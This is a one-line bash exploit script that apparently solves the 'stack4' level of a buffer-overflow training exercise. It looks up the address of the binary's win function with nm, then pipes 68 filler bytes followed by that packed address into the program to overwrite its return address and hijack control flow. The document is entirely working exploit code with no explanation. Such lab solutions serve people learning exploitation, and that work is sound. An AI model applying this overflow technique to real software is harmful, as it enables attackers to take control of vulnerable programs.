#!/usr/bin/env bash
python -c "import sys; import struct; print 'A'*68 + struct.pack('<I', int(sys.argv[1], 0))" `nm ../stack4/stack4 | grep win | cut -d " " -f 1 | xargs printf "0x%s\n"` | ../stack4/stack4 
